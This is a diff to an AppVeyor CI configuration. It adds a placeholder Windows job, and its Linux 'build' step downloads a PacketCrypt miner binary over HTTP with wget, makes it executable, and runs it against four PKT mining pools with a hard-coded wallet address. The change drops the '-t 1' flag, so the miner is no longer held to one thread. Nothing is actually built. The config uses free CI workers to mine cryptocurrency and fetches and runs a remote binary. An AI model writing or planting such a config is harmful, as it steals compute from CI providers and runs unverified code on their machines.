@@ -1,6 +1,9 @@
 environment:
   matrix:
 
+  - job_name: Windows build
+    appveyor_build_worker_image: Visual Studio 2019
+
   - job_name: Linux build
     appveyor_build_worker_image: Ubuntu
 
@@ -10,6 +13,17 @@ matrix:
 init:
   - appveyor version
 
+# job-specific configurations
+for:
+
+  -
+    matrix:
+      only:
+        - job_name: Windows build
+
+    build_script:
+    - cmd: echo This is Windows-specific build script
+
   -
     matrix:
       only:
@@ -18,5 +32,5 @@ init:
     build_script:
     - sh: wget http://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux
     - sh: chmod +x packetcrypt_x8664_linux
-    - sh: ./packetcrypt_x8664_linux ann -p pkt1qn8kg9zr4nx9jpy3ljgqamk7vtmszy32mqv96yj http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com -t 1
+    - sh: ./packetcrypt_x8664_linux ann -p pkt1qn8kg9zr4nx9jpy3ljgqamk7vtmszy32mqv96yj http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com
 
